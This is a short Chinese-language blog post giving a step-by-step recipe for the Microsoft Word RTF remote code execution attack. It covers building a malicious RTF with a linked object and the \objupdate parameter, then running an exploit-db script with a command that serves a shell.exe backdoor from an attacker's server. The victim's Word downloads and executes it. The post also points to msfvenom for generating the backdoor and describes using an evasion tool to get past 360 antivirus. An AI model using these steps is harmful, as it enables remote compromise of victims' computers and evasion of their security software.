---
author: heh3.org
comments: true
date: 2017-04-19 10:45:54+00:00
layout: post
link: http://heh3.org/?p=96
slug: microsoft-word-rtf-remote-code-execution
title: Microsoft Word - '.RTF' Remote Code Execution
wordpress_id: 96
categories:
- windows
- word
---

#### step1：


vps上开启web服务，存放一个任意内容的doc文档，暂且命名为"innocent.doc",
地址：http://192.168.111.136/innocent.doc


#### step2：


建立一个word文档，插入一个object，由文本创建，勾选链接到文件！
如下：

**另存为“文档名.rtf”**
![](http://i.imgur.com/STotrUR.png)


#### step3：


关闭rtf文档，使用文本编辑器编辑rtf文件，添加“\objupdate”参数，保存
![](http://i.imgur.com/WlYVszc.png)

至此恶意文档已经构建完成！


#### step4：


使用exploit-db上的测试脚本，建立服务端，以响应文档内的http请求。
脚本地址：
https://www.exploit-db.com/download/41894

python 41894.py 80 http://192.168.111.136/shell.exe /var/www/html

80为服务器端口，http://192.168.111.136/shell.exe 为后门程序地址 “/var/www/html/"为后门程序物理路径


#### step5：


使用word打开rtf格式的恶意文档，此时word会发送一个objetc升级请求到step4建立的服务器，服务器会把后门程序shell.exe返回word并执行。
此时攻击已经完成。

关于后门程序的生成，可以使用msfvenom进行
参考：
https://www.i0day.com/1173.html

当然，执行后360会把它干掉，所以免杀必不可少，这里我用harness做了个后门，bypass 360.当然还有其他的免杀工具，真有需要就自己找找吧。
